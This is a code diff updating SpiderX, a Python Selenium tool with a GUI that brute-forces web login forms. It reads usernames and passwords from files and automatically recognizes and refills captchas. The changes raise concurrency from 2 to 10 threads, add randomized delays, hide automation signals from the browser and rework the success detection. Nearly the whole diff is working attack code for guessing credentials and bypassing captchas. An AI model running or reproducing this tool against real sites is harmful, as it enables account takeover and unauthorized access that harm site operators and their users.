@@ -2,8 +2,8 @@
 """
 @Toolsname: SpiderX
 @Author  : LiChaser
-@Time    : 2025-01-25
-@Version : 1.0
+@Time    : 2025-01-30
+@Version : 2.0
 @Description:
     - 这是一个基于 Selenium 的自动化脚本。
     - 功能包括：登录、验证码识别、数据抓取等。
@@ -27,6 +27,7 @@ import requests
 import base64
 from io import BytesIO
 from PIL import Image
+import random
 
 # 配置界面主题和图标
 ctk.set_appearance_mode("Dark")
@@ -67,7 +68,7 @@ DEFAULT_CONFIG = {
     "success_xpath": '//*[contains(text(),"欢迎")]',  # 新增成功检测元素
     "user_file": "username.txt",
     "pass_file": "password.txt",
-    "threads": 2,               # 根据CPU核心数优化
+    "threads": 10,               # 根据CPU核心数优化
     "headless": True,
     "timeout": 5,               # 延长超时时间
     "max_retries": 3,           # 最大重试次数
@@ -566,152 +567,130 @@ class LoginGUI(ctk.CTk):
         try:
             # 优化浏览器配置
             options = webdriver.ChromeOptions()
-            options.add_argument("--headless=new")  # 使用新版无头模式
-            options.add_argument("--disable-gpu")
+            
+            # 基础配置
             options.add_argument("--no-sandbox")
             options.add_argument("--disable-dev-shm-usage")
-            options.add_argument("--disable-blink-features=AutomationControlled")
-            options.add_argument("--disable-infobars")
+            options.add_argument("--disable-gpu")
             options.add_argument("--disable-extensions")
+            options.add_argument("--disable-infobars")
+            
+            # 性能优化
             options.add_argument("--disable-logging")
-            options.add_argument("--disable-notifications")
             options.add_argument("--disable-default-apps")
             options.add_argument("--disable-popup-blocking")
-            options.add_argument("--disable-web-security")
-            options.add_argument("--disable-site-isolation-trials")
-            options.add_argument("--disable-features=TranslateUI")
-            options.add_argument("--disable-features=IsolateOrigins,site-per-process")
-            options.add_argument("--disable-features=VizDisplayCompositor")
-            options.add_argument("--disable-features=GlobalMediaControls")
-            options.add_argument("--disable-features=AutofillServerCommunication")
-            options.add_argument("--disable-features=OptimizationHints")
-            options.add_argument("--disable-features=NetworkService")
-            options.add_argument("--disable-features=NetworkServiceInProcess")
-            options.add_argument("--disable-features=Translate")
-            options.add_argument("--disable-features=WebRtcHideLocalIpsWithMdns")
-            options.add_argument("--disable-features=MediaRouter")
-            options.add_argument("--disable-features=WebUIDarkMode")
-            options.add_argument("--disable-features=WebContentsForceDark")
-            options.add_argument("--disable-features=AutofillEnableAccountWalletStorage")
-            options.add_argument("--disable-features=AutofillServerCommunication")
-            options.add_argument("--disable-features=AutofillShowTypePredictions")
-            options.add_argument("--disable-features=AutofillShowManualFallbackInSidebar")
-            options.add_argument("--disable-features=AutofillShowTypePredictions")
-            options.add_argument("--disable-features=AutofillShowManualFallbackInSidebar")
-            options.add_argument("--disable-features=AutofillShowTypePredictions")
-            options.add_argument("--disable-features=AutofillShowManualFallbackInSidebar")
-            options.add_argument("--disable-features=AutofillShowTypePredictions")
-            options.add_argument("--disable-features=AutofillShowManualFallbackInSidebar")
-            options.add_argument("--disable-features=AutofillShowTypePredictions")
-            options.add_argument("--disable-features=AutofillShowManualFallbackInSidebar")
-            
-            # 性能优化参数
-            options.add_argument("--js-flags=--expose-gc")
-            options.add_argument("--enable-precise-memory-info")
-            options.add_argument("--disable-javascript")
-            options.add_argument("--disable-images")
-            options.add_argument("--disable-css")
-            options.add_argument("--disable-animations")
-            options.add_argument("--disable-webgl")
-            options.add_argument("--disk-cache-size=1")
-            options.add_argument("--media-cache-size=1")
-            options.add_argument("--disk-cache-dir=/dev/null")
-            options.add_argument("--aggressive-cache-discard")
-            options.add_argument("--disable-application-cache")
+            options.add_argument("--disable-notifications")
             
             # 内存优化
-            options.add_argument("--memory-pressure-off")
-            options.add_argument("--no-zygote")
-            options.add_argument("--single-process")
-            options.add_argument("--process-per-site")
-            options.add_argument("--renderer-process-limit=1")
+            options.add_argument("--disable-application-cache")
+            options.add_argument("--disable-web-security")
+            options.add_argument("--disk-cache-size=1")
+            options.add_argument("--media-cache-size=1")
+            options.add_argument("--disable-gpu")
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
             
-            driver = webdriver.Chrome(options=options)
-            driver.get(url)
-
-            # 预加载元素定位
-            try:
-                username_field = driver.find_element(By.XPATH, name_elem)
-                password_field = driver.find_element(By.XPATH, pass_elem)
-                submit_btn = driver.find_element(By.XPATH, btn_elem)
-            except NoSuchElementException as e:
-                self.log_error('xpath_errors', f"元素未找到: {str(e)}")
-                return None
+            # 添加实验性选项
+            options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
+            options.add_experimental_option("useAutomationExtension", False)
+            
+            # 根据配置决定是否使用无头模式
+            if DEFAULT_CONFIG["headless"]:
+                options.add_argument("--headless")
+            
+            # 创建服务对象
+            service = webdriver.ChromeService(
+                log_output=os.devnull
+            )
+            
+            # 创建驱动
+            driver = webdriver.Chrome(
+                options=options,
+                service=service
+            )
+            captcha_handler = CaptchaHandler()
+            # 设置页面加载超时
+            driver.set_page_load_timeout(DEFAULT_CONFIG["timeout"])
+            driver.set_script_timeout(DEFAULT_CONFIG["timeout"])
 
             for password in password_chunk:
                 if not self.running:
                     break
-
-                try:
-                    current_count = numbers.increment()
-                    self.after(0, self._update_progress, current_count)
-
-                    # 处理验证码
-                    if DEFAULT_CONFIG["has_captcha"]:
-                        captcha_success = self.handle_captcha(driver)
-                        if not captcha_success:
-                            continue
-
-                    # 填充表单
-                    driver.execute_script("arguments[0].value = '';", username_field)
-                    driver.execute_script("arguments[0].value = '';", password_field)
-                    driver.execute_script(f"arguments[0].value = '{username}';", username_field)
-                    driver.execute_script(f"arguments[0].value = '{password}';", password_field)
-                    
-                    driver.execute_script("arguments[0].click();", submit_btn)
-
-                    # 优化登录检测
+                
+                retry_count = 0
+                max_retries = DEFAULT_CONFIG["captcha_retry_limit"]
+                
+                while retry_count < max_retries and self.running:
                     try:
-                        if self.check_login_success(driver):
-                            self.after(0, self._show_info, f"尝试[{current_count}] 用户:{username} 密码:{password} 成功!!!")
-                            self.stop_scan()
-                            return (username, password)
-                        else:
-                            self.after(0, self._show_info, f"尝试[{current_count}] 用户:{username} 密码:{password} 错误")
-                    except Exception as e:
-                        continue
-
-                    # 使用JavaScript重新加载页面（更快）
-                    driver.execute_script("window.location.href = arguments[0];", url)
-                    
-                    # 重新获取元素（使用缓存的定位器）
-                    try:
-                        username_field = driver.find_element(By.XPATH, name_elem)
-                        password_field = driver.find_element(By.XPATH, pass_elem)
-                        submit_btn = driver.find_element(By.XPATH, btn_elem)
-                    except TimeoutException as e:
-                        self.log_error('network_errors', f"网络超时: {str(e)}")
-                        driver.execute_script("window.location.reload();")
-                        username_field = driver.find_element(By.XPATH, name_elem)
-                        password_field = driver.find_element(By.XPATH, pass_elem)
-                        submit_btn = driver.find_element(By.XPATH, btn_elem)
-
-                except Exception as e:
-                    # 发生异常时进行恢复
-                    try:
-                        driver.execute_script("window.location.reload();")
-                        username_field = driver.find_element(By.XPATH, name_elem)
-                        password_field = driver.find_element(By.XPATH, pass_elem)
-                        submit_btn = driver.find_element(By.XPATH, btn_elem)
-                    except:
-                        # 如果恢复失败，重新创建driver
-                        if driver:
-                            driver.quit()
-                        driver = webdriver.Chrome(options=options)
+                        # 访问目标URL
                         driver.get(url)
-                        username_field = driver.find_element(By.XPATH, name_elem)
-                        password_field = driver.find_element(By.XPATH, pass_elem)
-                        submit_btn = driver.find_element(By.XPATH, btn_elem)
-                    continue
+                        
+                        # 获取元素
+                        username_field = WebDriverWait(driver, 1).until(
+                            EC.presence_of_element_located((By.XPATH, name_elem))
+                        )
+                        password_field = WebDriverWait(driver, 1).until(
+                            EC.presence_of_element_located((By.XPATH, pass_elem))
+                        )
+                        submit_btn = WebDriverWait(driver, 1).until(
+                            EC.element_to_be_clickable((By.XPATH, btn_elem))
+                        )
 
-        except NoSuchElementException as e:
-            self.log_error('xpath_errors', f"元素未找到: {str(e)}")
-        except TimeoutException as e:
-            self.log_error('network_errors', f"网络超时: {str(e)}")
-        except WebDriverException as e:
-            self.log_error('browser_errors', f"浏览器错误: {str(e)}")
+                        # 填充表单
+                        username_field.clear()
+                        username_field.send_keys(username)
+                        password_field.clear()
+                        password_field.send_keys(password)
+                        
+                        # 处理验证码（如果需要）
+                        if DEFAULT_CONFIG["has_captcha"]:
+                            captcha_success = self.handle_captcha(driver,captcha_handler)
+                            if not captcha_success:
+                                retry_count += 1
+                                self._show_info(f"验证码处理失败，重试第 {retry_count} 次")
+                                continue
+                        
+                        # 点击提交
+                        submit_btn.click()
+                 
+                        # 检查登录结果
+                        if self.check_login_success(driver,url):
+                            current_count = numbers.increment()
+                            self._show_info(f"尝试[{current_count}] 用户:{username} 密码:{password} 成功!!!")
+                            return (username, password)
+                        
+                        # 检查验证码错误
+                        if DEFAULT_CONFIG["has_captcha"] and self.check_captcha_error(driver):
+                            retry_count += 1
+                            self._show_info(f"验证码错误，重试第 {retry_count} 次: {username}:{password}")
+                            if retry_count < max_retries:
+                                self.refresh_captcha(driver)
+                                time.sleep(0.1)
+                                continue
+                        else:
+                            # 如果不是验证码错误，说明是密码错误
+                            current_count = numbers.increment()
+                            self._show_info(f"尝试[{current_count}] 用户:{username} 密码:{password} 错误")
+                            break  # 密码错误，尝试下一个密码
+
+                    except Exception as e:
+                        self._show_error(f"登录尝试异常: {str(e)}")
+                        retry_count += 1
+                        if retry_count < max_retries:
+                            try:
+                                driver.refresh()
+                            
+                            except:
+                                pass
+                            continue
+                        else:
+                            break
+
+                    finally:
+                        time.sleep(random.uniform(DEFAULT_CONFIG["min_delay"], DEFAULT_CONFIG["max_delay"]))
+
         except Exception as e:
-            self.log_error('other_errors', f"未知错误: {str(e)}")
+            self._show_error(f"浏览器操作失败: {str(e)}")
         finally:
             if driver:
                 try:
@@ -720,83 +699,82 @@ class LoginGUI(ctk.CTk):
                     pass
         return None
 
-    def check_login_success(self, driver):
-        """优化的登录成功检测"""
+    def check_captcha_error(self, driver):
+        """检查是否为验证码错误"""
         try:
-            # 1. 检查URL变化
-            current_url = driver.current_url.lower()
-            if 'login' not in current_url and 'index' in current_url:
-                return True
+            # 检查页面中是否包含验证码错误的文本
+            error_texts = ["验证码错误", "验证码不正确", "验证码输入有误", "验证码失效"]
+            page_source = driver.page_source.lower()
+            return any(text.lower() in page_source for text in error_texts)
+        except Exception as e:
+            logging.warning(f"验证码错误检查出现异常: {str(e)}")
+            return False
 
-            # 2. 检查常见的成功标识
-            success_indicators = [
-                "//div[contains(text(),'欢迎')]",
-                "//span[contains(text(),'欢迎')]",
-                "//div[contains(text(),'成功')]",
-                "//div[contains(text(),'登录成功')]",
-                "//div[contains(@class,'success')]",
-                "//div[contains(@class,'welcome')]",
-                DEFAULT_CONFIG["success_xpath"]  # 用户自定义的成功标识
-            ]
-
-            for xpath in success_indicators:
-                try:
-                    element = driver.find_element(By.XPATH, xpath)
-                    if element and element.is_displayed():
-                        return True
-                except:
-                    continue
-
-            # 3. 检查登录表单是否消失（使用配置的密码输入框XPath）
+    def refresh_captcha(self, driver):
+        """刷新验证码"""
+        try:
+            # 尝试点击验证码图片来刷新
             try:
-                password_field = driver.find_element(By.XPATH, DEFAULT_CONFIG["pass_xpath"])
-                if not password_field.is_displayed():
-                    return True
-            except NoSuchElementException:
-                # 如果找不到密码输入框，可能已经登录成功
+                captcha_img = driver.find_element(By.XPATH, DEFAULT_CONFIG["captcha_xpath"])
+                driver.execute_script("arguments[0].click();", captcha_img)
+                time.sleep(0.1)
                 return True
             except:
                 pass
 
-            # 4. 检查是否存在登出按钮
-            logout_indicators = [
-                "//a[contains(text(),'退出')]",
-                "//a[contains(text(),'注销')]",
-                "//button[contains(text(),'退出')]",
-                "//button[contains(text(),'注销')]",
-                "//a[contains(@href,'logout')]",
-                "//a[contains(@href,'signout')]"
-            ]
-
-            for xpath in logout_indicators:
-                try:
-                    element = driver.find_element(By.XPATH, xpath)
-                    if element and element.is_displayed():
-                        return True
-                except:
-                    continue
-
-            # 5. 检查错误提示是否存在
-            error_indicators = [
-                "//div[contains(text(),'密码错误')]",
-                "//div[contains(text(),'登录失败')]",
-                "//div[contains(@class,'error')]",
-                "//span[contains(text(),'错误')]",
-                "//p[contains(text(),'失败')]"
-            ]
-
-            for xpath in error_indicators:
-                try:
-                    element = driver.find_element(By.XPATH, xpath)
-                    if element and element.is_displayed():
-                        return False
-                except:
-                    continue
-
-            return False
+            # 如果点击失败，尝试刷新页面
+            driver.refresh()
+            # time.sleep(1)
+            return True
 
         except Exception as e:
-            self._show_error(f"登录检测异常: {str(e)}")
+            self._show_error(f"刷新验证码失败: {str(e)}")
+            return False
+
+    def check_login_success(self,driver,url):
+        try:
+       
+            #举例场景:错误登录页面跳转导致登录成功
+            # driver.get(url)
+            # 场景一: 登录成功后URL改变
+            # print(driver.current_url)
+            # time.sleep(0.2)
+            # if 'login' not in driver.current_url or 'dashboard' in driver.current_url :
+            #     self._show_info("登录疑似成功，URL改变。")
+            #     return True
+            if url!=driver.current_url:
+                self._show_info("登录疑似成功，URL改变。")
+                return True
+            # 检查URL变化，假设登录成功后URL会包含某些关键字
+            if '错误' in driver.page_source:
+                return False
+            # 场景三: 特殊元素(这为)
+            success_message_elements = [
+                "//div[contains(text(), '欢迎')]",
+                "//div[contains(text(), '成功')]",
+                "//div[contains(@class, 'logged-in')]"
+            ]
+            for xpath in success_message_elements:
+                try:
+                    element = driver.find_element(By.XPATH, xpath)
+                    if element.is_displayed():
+                        self._show_info(f"登录成功，页面元素检测通过：{xpath}")
+                        return True
+                except NoSuchElementException:
+                    continue
+
+            # 检查是否还存在登录表单
+            try:
+                login_form = driver.find_element(By.XPATH, DEFAULT_CONFIG["name_xpath"])
+                if not login_form.is_displayed():
+                    self._show_info("登录表单不可见，可能登录成功。")
+                    return True
+            except NoSuchElementException:
+                self._show_info("登录表单不可见，可能登录成功。")
+                return True
+            return False
+        except Exception as e:
+            self._show_error(f"检查登录成功时发生错误：{str(e)}")
             return False
 
     def _update_progress(self, count):
@@ -860,116 +838,101 @@ class LoginGUI(ctk.CTk):
         success_win.grab_set()  # 保持窗口置顶
         self.stop_scan()
 
-    def handle_captcha(self, driver):
-        """处理验证码识别流程"""
+    def handle_captcha(self,driver, captcha_handler):
+    # """处理验证码识别流程"""
         retry_count = 0
         while retry_count < DEFAULT_CONFIG["captcha_retry_limit"]:
             try:
                 # 等待验证码图片加载
-                captcha_img = WebDriverWait(driver, DEFAULT_CONFIG["captcha_timeout"]).until(EC.presence_of_element_located((By.XPATH, DEFAULT_CONFIG["captcha_xpath"])))
+                captcha_img = WebDriverWait(driver, DEFAULT_CONFIG["captcha_timeout"]).until(
+                    EC.presence_of_element_located((By.XPATH, DEFAULT_CONFIG["captcha_xpath"]))
+                )
                 
-                # 确保验证码图片完全加载
-                time.sleep(0.5)
+                # 等待图片完全加载
+                # time.sleep(1)
+                
+                # 确保图片已完全加载
+                try:
+                    is_loaded = driver.execute_script("""
+                        var img = arguments[0];
+                        return img.complete && img.naturalWidth !== 0;
+                    """, captcha_img)
+                    
+                    if not is_loaded:
+                        time.sleep(0.5)
+                except:
+                    pass
                 
                 # 获取验证码图片
                 try:
-                    # 获取图片URL
-                    img_url = captcha_img.get_attribute('src')
-                    if not img_url:
-                        raise Exception("No image source found")
-
-                    # 检查是否是动态验证码URL（包含时间戳或随机数）
-                    if '?' in img_url or 'timestamp' in img_url or 'random' in img_url:
-                        # 使用requests直接获取图片内容
-                        response = requests.get(img_url, timeout=3)
-                        image_data = response.content
-                    else:
-                        # 使用Selenium截图方式
-                        image_data = captcha_img.screenshot_as_png
-
-                except Exception as e:
-                    self._show_error(f"获取验证码图片失败: {str(e)}")
-                    # 尝试使用Canvas方式
-                    try:
-                        canvas_data = driver.execute_script("""
-                            var canvas = document.createElement('canvas');
-                            var context = canvas.getContext('2d');
-                            var img = arguments[0];
-                            canvas.width = img.naturalWidth || img.width;
-                            canvas.height = img.naturalHeight || img.height;
-                            context.drawImage(img, 0, 0);
-                            return canvas.toDataURL('image/png').substring(22);
-                        """, captcha_img)
-                        image_data = base64.b64decode(canvas_data)
-                    except:
+                    image_data = captcha_img.screenshot_as_png
+                except:
+                    img_src = captcha_img.get_attribute('src')
+                    if not img_src:
+                        logging.error("验证码图片源为空")
                         retry_count += 1
+                        self.refresh_captcha(driver)  # 只在获取失败时刷新
+                        # time.sleep(1)
                         continue
+                    
+                    if img_src.startswith('data:image'):
+                        try:
+                            base64_data = img_src.split(',')[1]
+                            image_data = base64.b64decode(base64_data)
+                        except Exception as e:
+                            logging.error(f"Base64解码失败: {str(e)}")
+                            retry_count += 1
+                            self.refresh_captcha(driver)  # 只在解码失败时刷新
+                            # time.sleep(1)
+                            continue
+                    else:
+                        try:
+                            response = requests.get(img_src, timeout=3)
+                            image_data = response.content
+                        except:
+                            logging.error("获取验证码图片失败")
+                            retry_count += 1
+                            self.refresh_captcha(driver)  # 只在获取失败时刷新
+                            time.sleep(0.2)
+                            continue
 
                 # 识别验证码
+                captcha_text = captcha_handler.recognize_captcha(image_data)
+                if not captcha_text:
+                    logging.warning("验证码识别结果为空")
+                    retry_count += 1
+                    self.refresh_captcha(driver)  # 只在识别失败时刷新
+                    # time.sleep(1)
+                    continue
+                
+                # logging.info(f"识别到的验证码: {captcha_text}")
+                
+                # 填写验证码
                 try:
-                    captcha_text = self.captcha_handler.recognize_captcha(image_data)
-                    if not captcha_text or len(captcha_text.strip()) == 0:
-                        raise Exception("验证码识别结果为空")
-                    
-                    #self._show_info(f"验证码识别结果: {captcha_text}")
-
-                    # 查找并填写验证码输入框
-                    captcha_input = WebDriverWait(driver, 0.5).until(
+                    captcha_input = WebDriverWait(driver, 1).until(
                         EC.presence_of_element_located((By.XPATH, DEFAULT_CONFIG["captcha_input_xpath"]))
                     )
-
-                    # 清空并填写验证码
-                    driver.execute_script("""
-                        arguments[0].value = '';
-                        arguments[0].value = arguments[1];
-                        arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
-                        arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
-                    """, captcha_input, captcha_text)
-
-                    # 等待一小段时间确保验证码已填写
-                    time.sleep(0.2)
                     
-                    # 验证验证码是否填写成功
-                    actual_value = driver.execute_script("return arguments[0].value;", captcha_input)
-                    if actual_value != captcha_text:
-                        raise Exception("验证码填写验证失败")
-
-                    return True
-
+                    captcha_input.clear()
+                    captcha_input.send_keys(captcha_text)
+                    # time.sleep(0.2)
+                    return True  # 成功输入验证码后直接返回
+                    
                 except Exception as e:
+                    logging.error(f"验证码输入失败: {str(e)}")
                     retry_count += 1
-                    self._show_warning(f"验证码处理失败: {str(e)}，正在重试 ({retry_count}/{DEFAULT_CONFIG['captcha_retry_limit']})")
-                    
-                    # 尝试刷新验证码
-                    try:
-                        refresh_btn = driver.find_element(By.XPATH, DEFAULT_CONFIG["captcha_refresh_xpath"])
-                        driver.execute_script("arguments[0].click();", refresh_btn)
-                        time.sleep(0.5)  # 等待新验证码加载
-                    except:
-                        try:
-                            # 如果没有刷新按钮，尝试点击验证码图片本身
-                            driver.execute_script("arguments[0].click();", captcha_img)
-                            time.sleep(0.5)
-                        except:
-                            # 如果点击失败，刷新整个页面
-                            driver.refresh()
-                            time.sleep(1)
+                    self.refresh_captcha(driver)  # 只在输入失败时刷新
+                    time.sleep(0.2)
                     continue
 
             except Exception as e:
+                logging.error(f"验证码处理失败: {str(e)}")
                 retry_count += 1
-                self.show_error(f"{captcha_text}")
-                self._show_error(f"验证码处理失败")
-                if retry_count >= DEFAULT_CONFIG["captcha_retry_limit"]:
-                    return False
-                
-                try:
-                    driver.refresh()
-                    time.sleep(1)
-                except:
-                    pass
+                self.refresh_captcha(driver)  # 只在处理失败时刷新
+                time.sleep(0.2)
+                continue
 
-        return False
+        return False 
 
     def toggle_captcha(self):
         """切换验证码识别功能"""
